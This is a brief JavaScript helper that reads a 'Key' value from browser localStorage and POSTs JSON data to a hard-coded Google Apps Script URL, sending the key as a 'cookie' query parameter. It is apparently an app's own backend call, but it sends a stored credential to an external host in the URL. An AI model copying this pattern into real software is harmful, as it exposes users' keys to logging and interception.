export default async function postData(data = {}) {
    const key = (`; ${localStorage.getItem('Key')}`).split(`; `).pop().split(';')[0];

    await fetch(`https://script.google.com/macros/s/AKfycbxMeQkR22stgbD7T0KwUL4wjolvGCkIUfdaENFoGP9YZ9arXYg_SxO4sxzdbfiKSBpPcg/exec?cookie=${key}`, {
        method: "POST",
        headers: {
            "Content-Type": "text/plain",
        },
        body: JSON.stringify(data)
    });
}